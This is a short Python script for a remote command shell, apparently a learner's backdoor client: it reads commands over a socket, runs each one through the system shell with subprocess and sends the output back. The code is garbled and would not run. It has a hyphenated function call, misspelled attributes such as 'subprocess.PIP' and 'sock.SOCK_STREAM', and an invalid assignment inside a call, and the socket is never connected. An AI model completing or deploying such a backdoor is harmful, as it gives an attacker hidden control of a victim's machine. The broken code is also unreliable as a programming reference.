import socket
import json
import subprocess

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ' '
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.load(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable-recv()
        if command == 'quit':
            break
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIP)
        result = execute.s(stdout.read() = execute.stderr.read()
        result = result.decode()
        reliable_send(result)    
   

s = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
shell()

